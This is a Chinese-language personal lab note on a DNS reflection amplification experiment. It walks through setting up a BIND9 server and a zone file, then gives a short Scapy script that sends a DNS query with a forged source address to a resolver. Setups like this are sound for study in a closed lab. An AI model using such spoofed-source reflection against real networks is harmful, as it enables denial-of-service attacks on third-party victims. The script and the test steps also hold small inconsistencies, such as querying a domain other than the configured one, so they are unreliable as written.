### 完整的DNS反射放大实验

最近要做一个DNS反射放大的实验，在这里记录一下，防止自己之后配置出问题。

攻击者向开放的DNS解析器发送一个具有伪造源地址的DNS查询请求，DNS解析器将响应结果返回值受害者IP地址。

#### 一、DNS服务器搭建

1. 安装

   ~~~
   sudo apt-get install -y bind9
   ~~~

   

2. 配置named.conf文件，添加如下内容

   ~~~
   zone "xy.com" IN {
   
   type master;
   
   file "/etc/bind/db.xy.com";
   
   };
   ~~~

   

3. 配置/etc/bind/db.xy.com文件，添加如下内容

   ~~~
   $TTL    604800
   @   IN  SOA xy.com. root.xy.com. (
                     2     ; Serial
                604800     ; Refresh
                 86400     ; Retry
               2419200     ; Expire
                604800 )   ; Negative Cache TTL
   ;
   @   IN  NS  xy.com.
   @   IN  A   10.1.1.104
   www.xy.com.  IN  A   10.1.1.104
   ~~~

   xy填写自己的域名，10.1.1.104改成自己要解析的地址

4. 重启服务

   ~~~
   service bind9 restart
   ~~~

#### 二、测试

1. 配置/etc/resov.conf

   ~~~
   nameserver 127.0.0.1
   nameserver your dns server addr
   ~~~

   把这个放在前面，因为dns是按照顺序解析的

2. nslookup测试

   ~~~
   nslookup www.abc.com
   ~~~

   解析出你的地址说明配置成功。

#### 三、攻击

脚本：

~~~
#coding=utf8

from scapy.all import *

ns = '192.168.19.129'
src = ''
pkt = IP(src=src,dst=ns)/UDP()/DNS(qd='www.abc.com',ns=ns)

send(pkt)
~~~







#### 参考链接

<https://www.jianshu.com/p/e254dde956ae>

<https://blog.51cto.com/14284354/2383573>

<https://blog.csdn.net/windyf2013/article/details/78859125>



